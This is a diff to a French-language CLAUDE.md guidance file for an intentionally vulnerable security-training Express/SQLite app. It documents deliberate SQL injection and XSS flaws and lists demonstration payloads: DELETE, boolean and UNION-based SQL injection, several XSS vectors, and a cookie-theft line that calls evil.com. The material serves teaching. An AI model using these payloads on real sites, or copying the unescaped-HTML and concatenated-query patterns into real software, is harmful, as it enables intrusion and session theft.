@@ -4,9 +4,13 @@ Ce fichier fournit des directives à Claude Code (claude.ai/code) lors du travai
 
 ## Vue d'ensemble du projet
 
-Il s'agit d'un **projet de formation à la sécurité** qui démontre intentionnellement des vulnérabilités d'injection SQL. La base de code est une API TypeScript/Express avec persistance SQLite, construite pour illustrer à la fois les modèles vulnérables et les alternatives sécurisées à des fins pédagogiques.
+Il s'agit d'un **projet de formation à la sécurité** qui démontre intentionnellement des vulnérabilités d'injection SQL et de Cross-Site Scripting (XSS). La base de code est une API TypeScript/Express avec persistance SQLite et une interface web, construite pour illustrer à la fois les modèles vulnérables et les alternatives sécurisées à des fins pédagogiques.
 
-**CRITIQUE** : `insertMessage()` et `findMessageById()` dans [src/lib/database.ts](src/lib/database.ts) contiennent des **vulnérabilités d'injection SQL intentionnelles**. Ne pas "corriger" ces fonctions sauf si vous mettez explicitement à jour le matériel de formation, car elles existent pour démontrer les risques de sécurité.
+**CRITIQUE - Vulnérabilités intentionnelles** :
+
+1. **Injection SQL** : `insertMessage()` et `findMessageById()` dans [src/lib/database.ts](src/lib/database.ts) utilisent la concaténation de chaînes au lieu de requêtes paramétrées.
+
+2. **Cross-Site Scripting (XSS)** : La route `GET /` dans [src/lib/app.ts](src/lib/app.ts) (lignes 54-263) génère du HTML en injectant directement le contenu des messages sans échappement. Tout contenu HTML/JavaScript sera exécuté dans le navigateur des visiteurs.
 
 ## Commandes de développement
 
@@ -48,13 +52,15 @@ npm run clean
 - **[src/index.ts](src/index.ts)** - Réexporte les modules lib pour les consommateurs de la racine du package
 - **[src/test/](src/test/)** - Fichiers de tests avec le suffixe `*.test.ts`
 
-### Routes API
+### Routes
 
 | Méthode | Route | Gestionnaire | Objectif |
 |--------|-------|---------|---------|
-| GET | `/messages` | `listMessagesHandler` | Liste les messages (du plus récent au plus ancien) |
-| GET | `/messages/:id` | `getMessageHandler` | Retourne un message par id (vulnérable à l'injection) |
-| POST | `/messages` | `createMessageHandler` | Crée un message (vulnérable à l'injection) |
+| GET | `/` | `homeHandler` | Page web principale (vulnérable au XSS) |
+| POST | `/` | `homePostHandler` | Traite le formulaire de création de message |
+| GET | `/messages` | `listMessagesHandler` | API : Liste les messages (du plus récent au plus ancien) |
+| GET | `/messages/:id` | `getMessageHandler` | API : Retourne un message par id (vulnérable à l'injection SQL) |
+| POST | `/messages` | `createMessageHandler` | API : Crée un message (vulnérable à l'injection SQL) |
 
 ### Conception du module Database
 
@@ -67,6 +73,27 @@ npm run clean
 **Fonctions sécurisées** :
 - `listMessages()` - Utilise correctement les requêtes paramétrées
 - `clearMessages()` - Helper de test pour réinitialiser l'état de la base de données
+
+## Démonstrations de vulnérabilités
+
+### Injection SQL
+
+Voir [src/test/app.test.ts](src/test/app.test.ts) pour des démonstrations annotées :
+- **DELETE injection** : `'); DELETE FROM messages; --` dans le body d'un message
+- **Boolean-based** : `1 OR 1=1` dans l'ID pour contourner la clause WHERE
+- **UNION-based** : `1 UNION SELECT name, sql, '2025' FROM sqlite_master` pour extraire le schéma
+
+### Cross-Site Scripting (XSS)
+
+Voir [src/test/xss.test.ts](src/test/xss.test.ts) pour des payloads commentés :
+- **Balise `<script>`** : `<script>alert('XSS')</script>`
+- **Événement onerror** : `<img src=x onerror="alert('XSS')">`
+- **Balise SVG** : `<svg onload="alert('XSS')">`
+- **Iframe javascript:** : `<iframe src="javascript:alert('XSS')">`
+- **Vol de cookies** : `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`
+- **Défacement** : `<img src=x onerror="document.body.innerHTML='COMPROMIS'">`
+
+**Interface de test** : Ouvrir `http://localhost:3000` dans un navigateur après `npm start` et tester les payloads XSS directement dans le formulaire.
 
 ## Approche de test
 
